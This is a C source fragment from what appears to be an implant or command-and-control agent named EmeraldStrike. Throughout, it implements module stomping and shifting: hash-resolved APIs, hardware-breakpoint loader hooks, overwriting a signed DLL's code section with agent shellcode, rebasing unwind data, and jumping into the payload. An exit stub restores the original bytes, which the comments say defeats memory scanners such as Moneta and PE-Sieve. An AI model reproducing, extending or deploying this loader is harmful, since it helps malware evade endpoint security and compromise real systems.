    typedef DWORD (WINAPI *fnGetFileAttributesW)(LPCWSTR);
    fnGetFileAttributesW pGetFileAttrsW = (fnGetFileAttributesW)resolve_function(k32, H_GETFILEATTRIBUTESW);

    // NtFlushInstructionCache
    typedef NTSTATUS (NTAPI *fnNtFlushIC)(HANDLE, PVOID, SIZE_T);
    fnNtFlushIC pFlushIC = (fnNtFlushIC)resolve_function(ntdll, H_NTFLUSHINSTRUCTIONCACHE);

    // RtlImageNtHeaderEx (for VEH interception)
    typedef NTSTATUS (NTAPI *fnRtlImageNtHeaderEx)(ULONG, PVOID, ULONG64, PIMAGE_NT_HEADERS*);
    fnRtlImageNtHeaderEx pRtlImgHdr = (fnRtlImageNtHeaderEx)resolve_function(ntdll, H_RTLIMAGENTHEADEREX);

    // Validate critical APIs
    if (!pLoadLibraryW || !pAddVEH || !pRemoveVEH || !pGetFileAttrsW ||
        !inst->Win32.NtCreateSection || !inst->Win32.NtMapViewOfSection ||
        !pRtlImgHdr || !inst->Win32.VirtualProtect || !inst->Win32.DuplicateHandle) {
        DBG(inst, "[ES] ModuleStomp: API resolution failed");
        return FALSE;
    }

    // Store resolved API addresses for the VEH context (also store locally-resolved ones)
    inst->Win32.GetFileAttributesW = pGetFileAttrsW;

    // Store API addresses the VEH handler will compare against
    ctx->pNtCreateSection = (PVOID)inst->Win32.NtCreateSection;
    ctx->pNtMapViewOfSection = (PVOID)inst->Win32.NtMapViewOfSection;
    ctx->pRtlImageNtHeaderEx = (PVOID)pRtlImgHdr;

    // ── Stomp sizing / section-fit validation happens in module_stomp_init ──

    // ── Select sacrifice DLL ──
    wchar_t sacName[64];
    ms_select_sacrifice(inst, sacName, 64);
    TRACE(inst, "MS: select returned");
    if (!sacName[0]) {
        DBG(inst, "[ES] ModuleStomp: no sacrifice DLL found");
        return FALSE;
    }
    TRACE(inst, "MS: sacrifice picked");
#ifdef DEBUG
    // Dump the first 12 chars of the chosen path (wide) - catches broken xwstr
    // decryption in obfuscated builds (symptom: LoadLibrary 126 MOD_NOT_FOUND
    // with a path that GetFileAttributesW validated seconds earlier).
    {
        char nb[40] = "MS: sacName=";
        for (int k = 0; k < 12 && sacName[k]; k++) {
            wchar_t wc = sacName[k];
            char c = (char)(wc & 0xFF);
            nb[12 + k] = (c >= 32 && c < 127) ? c : '?';
        }
        nb[24] = 0;
        TRACE(inst, nb);
    }
#endif

    // ── Set global context for VEH ──
    g_ms_inst = inst;
    g_ms_ctx = ctx;

    // ── Register VEH handler (first handler = priority 1) ──
    PVOID hHandler = pAddVEH(1, (PVOID)ms_veh_handler);
    if (!hHandler) {
        DBG(inst, "[ES] ModuleStomp: AddVEH failed");
        g_ms_inst = nullptr;
        g_ms_ctx = nullptr;
        return FALSE;
    }

    // ── Arm hardware breakpoints, not the trap flag ──
    //
    // The original design set EFLAGS.TF and single-stepped through the whole
    // of LoadLibraryW, re-arming TF in the VEH on every step. That storms the
    // exception dispatcher tens of thousands of times, and each dispatch runs
    // RtlLookupFunctionEntry, which takes the loader's unwind-database lock.
    // Observed on current Win11 builds (apphelp shim-engine active): the storm
    // deadlocks in ZwWaitForAlertByThreadId on the LDR critical section and
    // the process hangs inside LoadLibraryW before the stomp ever starts.
    //
    // HW breakpoints (#DB via Dr0-Dr3) fire ONLY on the three hook targets, so
    // exception dispatch is ~3 events total and the unwinder is out of the
    // hot path. DR7 = enable local DR0-2, break on execution (RW=00, LEN=00):
    //   DR7 = (1<<0)|(1<<2)|(1<<4) = L0|L1|L2
    //
    // VEH sees STATUS_SINGLE_STEP (0x80000004) on hook entry; we must clear
    // DR0-2/DR7 in the handler before continuing or the same instruction
    // re-fires forever.
    xstr(_gctx, "NtGetContextThread");
    xstr(_sctx, "NtSetContextThread");
    fnNtGetCtx pGetCtx = (fnNtGetCtx)resolve_function(ntdll, hash_string_djb2(_gctx));
    fnNtSetCtx pSetCtx = (fnNtSetCtx)resolve_function(ntdll, hash_string_djb2(_sctx));
    if (!pGetCtx || !pSetCtx) {
        DBG(inst, "[ES] ModuleStomp: context APIs unresolved");
        return FALSE;
    }
    // Stash for the VEH handler - context-write disarm is not reliable on this
    // Win11 build, so the handler disarms DRs via a direct NtSetContextThread.
    ctx->pGetCtx = (void*)pGetCtx;
    ctx->pSetCtx = (void*)pSetCtx;

    CONTEXT tc;
    es_memset(&tc, 0, sizeof(tc));
    tc.ContextFlags = 0x00100000 | 0x00000010;   // CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL
    if (!NT_SUCCESS(pGetCtx((HANDLE)-2 /*GetCurrentThread()*/, &tc))) {
        DBG(inst, "[ES] ModuleStomp: NtGetContextThread failed");
        return FALSE;
    }
    // DEBUG_REGISTERS context (x64 CONTEXT layout): Dr0 @0x48, Dr1 @0x50,
    // Dr2 @0x58, Dr7 @0x70 (0xF8 is RIP, not Dr7 - writing there corrupts the
    // return address and LoadLibraryW fails with garbage LastError).
    *(DWORD64*)((PBYTE)&tc + 0x48) = (DWORD64)ctx->pNtCreateSection;
    *(DWORD64*)((PBYTE)&tc + 0x50) = (DWORD64)ctx->pNtMapViewOfSection;
    *(DWORD64*)((PBYTE)&tc + 0x58) = (DWORD64)ctx->pRtlImageNtHeaderEx;
    *(DWORD64*)((PBYTE)&tc + 0x70) = 0x0000000000000015ULL;  // DR7: L0|L1|L2 (bits 0,2,4)
    if (!NT_SUCCESS(pSetCtx((HANDLE)-2, &tc))) {
        DBG(inst, "[ES] ModuleStomp: NtSetContextThread failed");
        return FALSE;
    }
    TRACE(inst, "MS: HW breakpoints armed");

    // ── Load the sacrifice DLL (VEH will intercept via HW breakpoints) ──
    HMODULE hSac = pLoadLibraryW(sacName);

    // ── Remove VEH handler ──
    pRemoveVEH(hHandler);
    g_ms_inst = nullptr;
    g_ms_ctx = nullptr;

    // ── DEFENSIVE: disarm any leftover hardware breakpoints ──
    // If the load took a path that never hit all three hooks (e.g. the DLL was
    // already mapped and the loader short-circuited), DR0-3 can still be armed
    // and will fault later on unrelated code. Clear unconditionally, with
    // readback verification: an unverified clear here is exactly how an armed
    // Dr2 survived into the main loop and crashed the process.
    {
        CONTEXT tc2;
        for (int attempt = 0; attempt < 5; attempt++) {
            es_memset(&tc2, 0, sizeof(tc2));
            tc2.ContextFlags = 0x00100010;
            if (!NT_SUCCESS(pGetCtx((HANDLE)-2, &tc2)))
                continue;
            if ((tc2.Dr0 | tc2.Dr1 | tc2.Dr2 | tc2.Dr3 | tc2.Dr7) == 0)
                break;   // verified clean
            tc2.Dr0 = 0; tc2.Dr1 = 0; tc2.Dr2 = 0; tc2.Dr3 = 0; tc2.Dr7 = 0;
            if (!NT_SUCCESS(pSetCtx((HANDLE)-2, &tc2)))
                continue;
        }
        // final readback check
        es_memset(&tc2, 0, sizeof(tc2));
        tc2.ContextFlags = 0x00100010;
        if (NT_SUCCESS(pGetCtx((HANDLE)-2, &tc2)) &&
            (tc2.Dr0 | tc2.Dr1 | tc2.Dr2 | tc2.Dr3 | tc2.Dr7) != 0) {
            DBG(inst, "[ES] ModuleStomp: DR clear FAILED - Le bit set, aborting stomp");
            return FALSE;
        }
    }

    if (!hSac) {
        DWORD gle = (DWORD)__readgsqword(0x68);   // TEB->LastErrorValue
        char buf[64] = "[ES] ModuleStomp: LoadLibraryW failed gle=";
        const char* hex = "0123456789abcdef";
        int p = 42;
        for (int s = 28; s >= 0 && p < 59; s -= 4) buf[p++] = hex[(gle >> s) & 0xF];
        buf[p] = 0;
        DBG(inst, buf);
        TRACE(inst, buf);
        return FALSE;
    }

    ctx->pSacDllBase = (PVOID)hSac;

    // ── Validate VEH interception results ──
    if (!ctx->bEntryPatched) {
        DBG(inst, "[ES] ModuleStomp: VEH did not patch entry");
        return FALSE;
    }

    // ── Resolve .text and .pdata sections of sacrifice DLL ──
    if (ctx->SacText.pBase == nullptr || ctx->SacText.dwVirtualSize == 0) {
        // VEH should have filled this; try again
        if (!ms_find_section(ctx->pSacDllBase, ".text", &ctx->SacText)) {
            DBG(inst, "[ES] ModuleStomp: can't find sacrifice .text");
            return FALSE;
        }
    }

    // Validate sacrifice .text is large enough (loader guarantees SacText is
    // populated or ms_load_sacrifice already returned FALSE)
    if (ctx->SacText.dwVirtualSize < ctx->szStomp) {
        DBG(inst, "[ES] ModuleStomp: sacrifice .text too small");
        return FALSE;
    }

    // Find .pdata
    ms_find_section(ctx->pSacDllBase, ".pdata", &ctx->SacPdata);

    return TRUE;
}

// ────────────────────────────────────────────────────────────────────
// Module Stomp Init - main entry point
// ────────────────────────────────────────────────────────────────────

BOOL module_stomp_init(PINSTANCE inst) {
    // Zero out the context
    es_memset(&inst->ModuleStomp, 0, sizeof(MODULE_STOMP_CTX));

    PMODULE_STOMP_CTX ctx = &inst->ModuleStomp;

    // ── Calculate stomp size BEFORE loading the sacrifice ──
    // ms_load_sacrifice validates `SacText.dwVirtualSize < ctx->szStomp`; with
    // szStomp still 0 that check trivially passed, so an oversized blob was
    // accepted and the later VirtualProtect(RW) for szStomp bytes failed
    // silently - es_memset then wrote into still-RX module .text:
    // INVALID_POINTER_WRITE_c0000005 (dump-verified 2026-11-10, both
    // emeraldstrike(10)/emeraldstrike(11) startup crashes: memset of
    // 0x3b2f2c into sacrifice+0x1000). Compute the size first so the
    // sacrifice-size gate actually gates.
#ifdef INCLUDE_EVASION_MODULE_SHIFT
    // Shift mode: the agent blob lands at section_base + pad so the section's
    // first page still matches the on-disk image (mimics the benign partial
    // overwrite behavior naksyn's ModuleShifting describes).
    DWORD pad = MODULE_SHIFT_PAD;
    ctx->bShiftActive = TRUE;
    ctx->dwShiftPad = pad;
    ctx->szStomp = (SIZE_T)pad + inst->Base.Length;
#else
    ctx->szStomp = inst->Base.Length;
#endif
    if (ctx->szStomp == 0) {
        DBG(inst, "[ES] ModuleStomp: Base.Length is zero");
        return FALSE;
    }

    // ── Load the sacrifice DLL (shared VEH path) ──
    if (!ms_load_sacrifice(inst, ctx))
        return FALSE;

    // Re-validate against the now-loaded sacrifice (defence in depth: the
    // loader's own check runs against ctx->szStomp as set above).
    if (ctx->SacText.pBase == nullptr ||
        ctx->SacText.dwVirtualSize < ctx->szStomp) {
        DBG(inst, "[ES] ModuleStomp: sacrifice .text smaller than stomp size - aborting");
        return FALSE;
    }

    // ── Make sacrifice .text writable and zero it ──
    PBYTE copyDest = (PBYTE)ctx->SacText.pBase;
    DWORD oldProt = 0;
    // CHECKED: a failed protect leaves .text RX and the memset/copy below
    // writes into read-only module memory - INVALID_POINTER_WRITE_c0000005
    // (the exact startup crash this guard was missing for). Bail instead.
    if (!inst->Win32.VirtualProtect(ctx->SacText.pBase, ctx->szStomp,
                                    PAGE_READWRITE, &oldProt)) {
        DBG(inst, "[ES] ModuleStomp: VirtualProtect(RW) on sacrifice .text failed - aborting");
        return FALSE;
    }
    if (oldProt == PAGE_READWRITE) {
        DBG(inst, "[ES] ModuleStomp: sacrifice .text already RW - unexpected, aborting");
        return FALSE;
    }
#ifdef INCLUDE_EVASION_MODULE_SHIFT
    // Capture the original protection now (post-flip oldProt holds it) and
    // back up the section bytes we are about to clobber so agent exit can
    // restore them - erasing the Modified-Code IoC that memory-vs-disk
    // differencing tools (Moneta, PE-Sieve) key on.
    ctx->dwTextProt = oldProt;
    ctx->szTextBackup = ctx->szStomp;
    ctx->pTextBackup = es_malloc(inst, ctx->szTextBackup);
    if (ctx->pTextBackup)
        es_memcpy(ctx->pTextBackup, ctx->SacText.pBase, ctx->szTextBackup);
#endif
#ifndef INCLUDE_EVASION_MODULE_SHIFT
    const DWORD pad = 0;   // shift builds declare pad in the sizing block above
#endif
    es_memset(copyDest, 0, ctx->szStomp - pad);
    // ── Copy agent shellcode into sacrifice .text (at the pad offset) ──
    PVOID srcBase = inst->Base.Buffer;
    SIZE_T srcLen = inst->Base.Length;
    copyDest += pad;
    es_memcpy(copyDest, srcBase, srcLen);

    // ── Agent unwind data ──
#ifdef MODULE_STOMP_OVERLOAD
    // Overload path: register the agent's .pdata via RtlAddFunctionTable instead of
    // transplanting it over the sacrifice's .pdata. The blob's RUNTIME_FUNCTION
    // entries are relative to the agent image base (VMA 0), and the blob lives at
    // copyDest - registering with ImageBase=copyDest resolves them with NO rebase
    // math, and the sacrifice's own unwind data stays intact (no stability risk for
    // its frames, no Modified-.pdata IoC).
    {
        PIMAGE_DOS_HEADER agentDos = (PIMAGE_DOS_HEADER)srcBase;
        if (agentDos->e_magic == 0x5A4D) {
            PIMAGE_NT_HEADERS agentNt = (PIMAGE_NT_HEADERS)((PBYTE)srcBase + agentDos->e_lfanew);
            PIMAGE_SECTION_HEADER agentSec = IMAGE_FIRST_SECTION(agentNt);
            PIMAGE_DATA_DIRECTORY pExcDir =
                &agentNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
            if (pExcDir->Size > 0) {
                PRUNTIME_FUNCTION agentRF = (PRUNTIME_FUNCTION)((PBYTE)srcBase + pExcDir->VirtualAddress);
                DWORD rfCount = pExcDir->Size / sizeof(RUNTIME_FUNCTION);
                // Resolve RtlAddFunctionTable from ntdll (also exported from kernel32)
                typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, ULONG64);
                xstr(_raft, "RtlAddFunctionTable");
                fnRtlAddFunctionTable pAddFT = (fnRtlAddFunctionTable)resolve_function(
                    inst->Modules.Ntdll, hash_string_djb2(_raft));
                if (pAddFT && pAddFT(agentRF, rfCount, (ULONG64)copyDest)) {
                    DBG(inst, "[ES] ModuleStomp: unwind table registered");
                } else {
                    DBG(inst, "[ES] ModuleStomp: RtlAddFunctionTable failed - no unwind info");
                }
            }
        }
    }
#else
    if (ctx->SacPdata.pBase && ctx->SacPdata.dwVirtualSize > 0) {
        // Parse agent PE headers to find .pdata section
        PIMAGE_DOS_HEADER agentDos = (PIMAGE_DOS_HEADER)srcBase;
        if (agentDos->e_magic == 0x5A4D) {
            PIMAGE_NT_HEADERS agentNt = (PIMAGE_NT_HEADERS)((PBYTE)srcBase + agentDos->e_lfanew);
            PIMAGE_SECTION_HEADER agentSec = IMAGE_FIRST_SECTION(agentNt);

            for (DWORD i = 0; i < agentNt->FileHeader.NumberOfSections; i++) {
                if (agentSec[i].Name[0] == '.' && agentSec[i].Name[1] == 'p' &&
                    agentSec[i].Name[2] == 'd' && agentSec[i].Name[3] == 'a' &&
                    agentSec[i].Name[4] == 't' && agentSec[i].Name[5] == 'a') {
                    DWORD pdataSize = agentSec[i].Misc.VirtualSize;
                    if (pdataSize > 0 && pdataSize <= ctx->SacPdata.dwVirtualSize) {
                        DWORD pdataOldProt = 0;
                        PVOID pdataAddr = ctx->SacPdata.pBase;
                        SIZE_T pdataRegion = ctx->SacPdata.dwVirtualSize;
                        inst->Win32.VirtualProtect(pdataAddr, pdataRegion,
                                                    PAGE_READWRITE, &pdataOldProt);
#ifdef INCLUDE_EVASION_MODULE_SHIFT
                        // Back up the original .pdata bytes for the exit restore
                        ctx->dwPdataProt = pdataOldProt;
                        ctx->szPdataBackup = pdataRegion;
                        ctx->pPdataBackup = es_malloc(inst, pdataRegion);
                        if (ctx->pPdataBackup)
                            es_memcpy(ctx->pPdataBackup, pdataAddr, pdataRegion);
#endif

                        // Fill with 0xFF first (avoids issues with RUNTIME_FUNCTION ordering)
                        es_memset(ctx->SacPdata.pBase, 0xFF, ctx->SacPdata.dwVirtualSize);

                        // Copy agent's .pdata
                        es_memcpy(ctx->SacPdata.pBase,
                                  (PVOID)((PBYTE)srcBase + agentSec[i].PointerToRawData),
                                  pdataSize);

#ifdef INCLUDE_EVASION_MODULE_SHIFT
                        // Rebase every RUNTIME_FUNCTION RVA by the pad delta.
                        //
                        // The unwind dispatcher resolves an address via
                        // RIP - image_base, so with the agent copied at
                        // section_base + dwShiftPad the transplanted entries
                        // must cover [pad + rva, pad + rva + len). Without
                        // rebasing, lookups for pad-shifted RIPs miss (most
                        // functions are < 0x200 bytes) or hit the wrong entry,
                        // and VEH exception dispatch unwinding through the
                        // agent's own frames deadlocks the loader.
                        if (ctx->dwShiftPad) {
                            PRUNTIME_FUNCTION rf = (PRUNTIME_FUNCTION)ctx->SacPdata.pBase;
                            DWORD count = pdataSize / sizeof(RUNTIME_FUNCTION);
                            for (DWORD k = 0; k < count; k++) {
                                if (rf[k].BeginAddress == 0xFFFFFFFF) break;  // 0xFF filler
                                rf[k].BeginAddress += ctx->dwShiftPad;
                                rf[k].EndAddress   += ctx->dwShiftPad;
                                if (rf[k].UnwindData != 0xFFFFFFFF)
                                    rf[k].UnwindData += ctx->dwShiftPad;
                            }
                        }
#endif
                        // Plain stomp (no shift) ALSO needs rebasing: the blob
                        // lands at SacText.pBase = sacrifice_base + section_rva
                        // (+pad), but the transplanted entries carry the AGENT's
                        // image-relative RVAs. Unwind lookups for RIP inside the
                        // blob miss (or - worse - collide with the sacrifice's
                        // own function at that RVA, handing back garbage unwind
                        // data -> wild RIP, observed as 0xC0000005/0xC0000409
                        // deep in the sacrifice minutes after transfer). The
                        // delta is (copyDest - sacrifice_image_base).
                        {
                            // Begin/EndAddress point into .text: delta = blob
                            // location - agent image base. UnwindData points
                            // into .pdata: its own delta = pdata_rva (the agent
                            // unwind info was copied to pdata_rva + orig_rva).
                            DWORD deltaText = (DWORD)((DWORD64)copyDest - (DWORD64)ctx->pSacDllBase);
                            MS_SECTION_INFO sacPdataInfo = {0};
                            DWORD deltaUnwind = 0;
                            if (ms_find_section(ctx->pSacDllBase, ".pdata", &sacPdataInfo))
                                deltaUnwind = (DWORD)((PBYTE)sacPdataInfo.pBase - (PBYTE)ctx->pSacDllBase);
                            PRUNTIME_FUNCTION rf = (PRUNTIME_FUNCTION)ctx->SacPdata.pBase;
                            DWORD count = pdataSize / sizeof(RUNTIME_FUNCTION);
                            for (DWORD k = 0; k < count; k++) {
                                if (rf[k].BeginAddress == 0xFFFFFFFF) break;  // 0xFF filler
                                rf[k].BeginAddress += deltaText;
                                rf[k].EndAddress   += deltaText;
                                if (rf[k].UnwindData != 0xFFFFFFFF)
                                    rf[k].UnwindData += deltaUnwind;
                            }
                        }

                        // Restore pdata protection
                        inst->Win32.VirtualProtect(pdataAddr, pdataRegion,
                                                    pdataOldProt, &pdataOldProt);
                    }
                    break;
                }
            }
        }
    }
#endif

    // ── Calculate the delta between old and new base for relocation ──
    PBYTE newBase = (PBYTE)copyDest;
    PBYTE oldBase = (PBYTE)srcBase;
    LONG_PTR delta = (LONG_PTR)(newBase - oldBase);

    // ── Find the INSTANCE storage in the new copy ──
    // In standalone PIC mode, __InstanceStorage is at the end of the shellcode
    // (last 16KB of .text). The INSTANCE struct is accessed via _get_instance()
    // which uses an offset from the code base. We need to update Base.Buffer
    // in the NEW copy's INSTANCE.
    //
    // Since the entire shellcode is byte-copied, the new INSTANCE is at:
    //   newBase + (INSTANCE_offset_from_old_base)
    // The _get_instance() function uses RIP-relative addressing (x64), so it
    // will automatically point to the new copy's INSTANCE when executing from
    // the new location. We just need to update Base.Buffer there.

    // ── Locate the INSTANCE in the new copy ──
    //
    // The shellcode blob is copied verbatim, so the INSTANCE sits at the SAME
    // relative offset from the base in both copies. Derive it directly rather
    // than scanning for a magic value: __InstanceStorage is not guaranteed to
    // be 8-byte aligned inside the folded .text section, and an off += 8 scan
    // then steps straight over it (or, worse, matches a false positive).
    PINSTANCE newInst = (PINSTANCE)(newBase + ((PBYTE)inst - (PBYTE)oldBase));

    // The copied Base field must still hold the original pointer/length.
    if (newInst->Base.Buffer != srcBase || newInst->Base.Length != (ULONG)srcLen) {
        DBG(inst, "[ES] ModuleStomp: new INSTANCE sanity check failed");
        newInst = nullptr;
    }

    if (newInst) {
        // Update Base.Buffer to point at the new location
        newInst->Base.Buffer = (PVOID)newBase;

        // Copy the ModuleStomp context (section handle, sacrifice info)
        es_memcpy(&newInst->ModuleStomp, ctx, sizeof(MODULE_STOMP_CTX));

        // Preserve original allocation info for cleanup
        newInst->pOriginalAlloc = srcBase;
        newInst->szOriginalAlloc = srcLen;

        // Re-point the copy's __Instance global at the new storage.
        //
        // Do NOT use &__Instance here: that is a link-time VMA (near 0), not the
        // runtime address, so the offset arithmetic underflows. __Instance lives
        // 8 bytes before __InstanceStorage (entry.x64.asm: __Instance_offset is
        // a dd, then __Instance is a dq, then the 16KB storage), and inst points
        // at __InstanceStorage.
        PVOID* pOldInstGlobal = (PVOID*)((PBYTE)inst - sizeof(PVOID));
        ULONG_PTR instGlobalOff = (ULONG_PTR)((PBYTE)pOldInstGlobal - (PBYTE)oldBase);
        if (instGlobalOff < srcLen) {
            *(PVOID*)(newBase + instGlobalOff) = (PVOID)newInst;
        } else {
            DBG(inst, "[ES] ModuleStomp: __Instance offset out of range");
        }
    }

    // ── Make sacrifice .text executable ──
    // The stomped region contains both code and writable data (.data/.bss/INSTANCE).
    // Use RWX for the entire region. The sacrifice DLL was loaded as a signed
    // module, so the backing is still MEM_IMAGE - which is the primary evasion
    // benefit (file-backed memory, not anonymous private).
    inst->Win32.VirtualProtect(ctx->SacText.pBase, ctx->szStomp,
                                PAGE_EXECUTE_READWRITE, &oldProt);

    // ── Flush instruction cache ──
    {
        typedef NTSTATUS (NTAPI *fnNtFlushIC)(HANDLE, PVOID, SIZE_T);
        fnNtFlushIC pFlushIC = (fnNtFlushIC)resolve_function(inst->Modules.Ntdll,
            H_NTFLUSHINSTRUCTIONCACHE);
        if (pFlushIC) {
            pFlushIC((HANDLE)-1, nullptr, 0);
        }
    }

    // ── Transfer execution to the new copy ──
    // CRITICAL: We are still executing from the OLD allocation (module_stomp_init
    // is part of the shellcode blob). We CANNOT zero or free the old allocation
    // before transferring. Instead, we record the old allocation in the new
    // INSTANCE so it can be cleaned up after the transfer.

    DBG(inst, "[ES] ModuleStomp: stomped, transferring execution");

    if (newInst) {
        // agent_main's offset from the shellcode base is identical in both copies.
        typedef VOID (*fn_agent_main)(PINSTANCE);
        ULONG_PTR agent_main_offset = (ULONG_PTR)agent_main - (ULONG_PTR)oldBase;
        fn_agent_main new_agent_main = (fn_agent_main)(newBase + agent_main_offset);

        // Guard: the target must land inside the sized stomp window, otherwise
        // the relocation model above is wrong and we must not jump.
        ULONG_PTR amAddr  = (ULONG_PTR)new_agent_main;
        ULONG_PTR amLimit = (ULONG_PTR)newBase + srcLen;
        if (amAddr < (ULONG_PTR)newBase || amAddr >= amLimit) {
            DBG(inst, "[ES] ModuleStomp: agent_main out of bounds in sacrifice");
            return FALSE;
        }

        DBG(inst, "[ES] ModuleStomp: jumping to new agent_main");
        new_agent_main(newInst);

        // agent_main should not return, but if it does:
        return TRUE;
    }

    // Fallback: new INSTANCE not found, can't transfer
    DBG(inst, "[ES] ModuleStomp: INSTANCE not found in new copy");
    return FALSE;
}

#ifdef INCLUDE_EVASION_MODULE_SHIFT

// ────────────────────────────────────────────────────────────────────
// Exit-time restore stub.
//
// When the agent exits it is executing INSIDE the sacrifice .text region it
// wants to restore, so a plain memcpy-back would overwrite the restoring
// code mid-flight. This tiny position-independent stub is copied into a
// fresh RWX page and does the copy + protection restore + thread exit from
// memory that is not part of the restored region.
//
// Entry contract (set via inline asm by module_shift_restore):
//   rsi = backup buffer (src)
//   rdi = region base   (dst)
//   rcx = length
//   r8  = VirtualProtect
//   r15 = ExitThread/ExitProcess
//   rax = protection to restore
//   r14 = scratch dword (receives lpflOldProtect; inside the stub's frame)
// ────────────────────────────────────────────────────────────────────
static const BYTE ms_restore_stub[] = {
    0x55,                   // push rbp
    0x48, 0x89, 0xE5,       // mov rbp, rsp
    0x48, 0x83, 0xE4, 0xF0, // and rsp, -16      (align regardless of caller)
    0x48, 0x83, 0xEC, 0x40, // sub rsp, 0x40      (shadow space + scratch)
    0x57,                   // push rdi           (save dst)
    0x51,                   // push rcx           (save length)
    0xFC,                   // cld
    0xF3, 0xA4,             // rep movsb          (restore region bytes)
    0x59,                   // pop rcx            (dst)
    0x5A,                   // pop rdx            (length)
    0x4C, 0x8D, 0x4C, 0x24, 0x20, // lea r9, [rsp+0x20]  (&old_protect scratch)
    0x49, 0x89, 0xC0,       // mov r8, rax        (protection to restore)
    0xFF, 0xD2,             // call r8            (VirtualProtect)
    0x48, 0x89, 0xEC,       // mov rsp, rbp
    0x5D,                   // pop rbp
    0x31, 0xC9,             // xor ecx, ecx
    0x41, 0xFF, 0xE7        // jmp r15            (ExitThread / ExitProcess(0))
};

VOID module_shift_restore(PINSTANCE inst) {
    PMODULE_STOMP_CTX ctx = &inst->ModuleStomp;

    // One-shot: only when a shift-mode backup exists and has not been restored
    if (!ctx->bShiftActive || ctx->bBackupRestored) return;
    ctx->bBackupRestored = TRUE;

    if (!ctx->pTextBackup || ctx->szTextBackup == 0 || !ctx->SacText.pBase) return;

    // .pdata first: we are not executing from it, so it can be restored inline
    if (ctx->pPdataBackup && ctx->szPdataBackup > 0 && ctx->SacPdata.pBase) {
        DWORD op = 0;
        inst->Win32.VirtualProtect(ctx->SacPdata.pBase, ctx->SacPdata.dwVirtualSize,
                                    PAGE_READWRITE, &op);
        es_memcpy(ctx->SacPdata.pBase, ctx->pPdataBackup, ctx->szPdataBackup);
        inst->Win32.VirtualProtect(ctx->SacPdata.pBase, ctx->SacPdata.dwVirtualSize,
                                    ctx->dwPdataProt, &op);
        es_free(inst, ctx->pPdataBackup);
        ctx->pPdataBackup = nullptr;
    }

    // Choose the exit function per ExitFunc (set by cmd_exit)
    PVOID exitfn = (inst->ExitFunc == 1)
        ? (PVOID)inst->Win32.ExitProcess
        : (PVOID)inst->Win32.ExitThread;
    if (!exitfn || !inst->Win32.VirtualProtect) return;

    // Stage the restore stub outside the region being restored
    PVOID stub_mem = inst->Win32.VirtualAlloc(NULL, 0x1000,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub_mem) return;
    es_memcpy(stub_mem, (PVOID)ms_restore_stub, sizeof(ms_restore_stub));

    DBG(inst, "[ES] ModuleShift: restoring sacrifice region, exiting");

    // Jump into the stub: it restores the region (overwriting this call site)
    // and exits the thread/process from its own page.
    __asm__ volatile(
        "mov rsi, %0 \n\t"
        "mov rdi, %1 \n\t"
        "mov rcx, %2 \n\t"
        "mov r8, %3 \n\t"
        "mov r15, %4 \n\t"
        "mov rax, %5 \n\t"
        "mov r14, %6 \n\t"
        "call %7 \n\t"
        :
        : "r"((PVOID)ctx->pTextBackup),
          "r"((PVOID)ctx->SacText.pBase),
          "r"((SIZE_T)ctx->szTextBackup),
          "r"((PVOID)inst->Win32.VirtualProtect),
          "r"(exitfn),
          "r"((ULONG_PTR)ctx->dwTextProt),
          "r"((PBYTE)stub_mem + 0x800),
          "r"(stub_mem)
        : "memory");

    // Unreachable
}

#endif // INCLUDE_EVASION_MODULE_SHIFT

#endif // _WIN64
#endif // INCLUDE_EVASION_MODULE_STOMP
